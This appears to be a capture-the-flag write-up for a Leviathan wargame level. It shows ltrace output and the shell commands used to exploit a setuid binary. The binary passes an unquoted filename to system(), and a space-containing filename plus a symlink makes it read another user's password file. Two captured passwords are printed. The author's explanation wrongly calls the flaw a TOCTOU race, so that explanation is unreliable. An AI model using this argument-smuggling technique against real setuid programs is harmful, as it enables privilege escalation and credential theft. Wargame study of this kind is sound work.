@@ -1,0 +1,50 @@
+I check with ltrace what are the functions while executing password from leviathan3
+
+leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
+__libc_start_main(0x804852b, 2, 0xffffd674, 0x8048610 <unfinished ...>
+access("/etc/leviathan_pass/leviathan3", 4)                                = -1
+puts("You cant have that file..."You cant have that file...
+)                                         = 27
++++ exited (status 1) +++
+
+and then file I can access so /etc/leviathan_pass/leviathan2:
+
+leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2
+__libc_start_main(0x804852b, 2, 0xffffd674, 0x8048610 <unfinished ...>
+access("/etc/leviathan_pass/leviathan2", 4)                                = 0
+snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
+geteuid()                                                                  = 12002
+geteuid()                                                                  = 12002
+setreuid(12002, 12002)                                                     = 0
+system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                     = 0
++++ exited (status 0) +++
+
+After little bit of googling, in script there is a TOCTOU race vulnerability, very nice explanation here:
+
+https://hackernoon.com/time-of-check-to-time-of-use-toctou-a-race-condition-99c2311bd9fc
+
+so TL;DR = access() calls function open() after small period of time so something can be changed meanwhile.
+
+The solution is to create a two files at once so that /bin/cat will treat symlink and file as two different elements and when system() function executes, it will show content of file linked by symlink:
+
+leviathan2@leviathan:~$ mkdir /tmp/azerty14
+leviathan2@leviathan:~$ cd /tmp/azerty14
+leviathan2@leviathan:/tmp/azerty14$ touch symlink\ file
+leviathan2@leviathan:/tmp/azerty14$ ls -al
+total 228
+drwxr-sr-x    2 leviathan2 root   4096 Apr 26 14:35 .
+drwxrws-wt 3664 root       root 225280 Apr 26 14:35 ..
+-rw-r--r--    1 leviathan2 root      0 Apr 26 14:35 symlink file
+leviathan2@leviathan:/tmp/azerty14$ cd
+leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/azerty14/symlink
+leviathan2@leviathan:~$ ./printfile /tmp/azerty14/symlink
+You cant have that file...
+leviathan2@leviathan:~$ ./printfile /tmp/azerty14/symlink\ file
+Ahdiemoo1j
+/bin/cat: file: No such file or directory
+leviathan2@leviathan:~$ 
+
+  
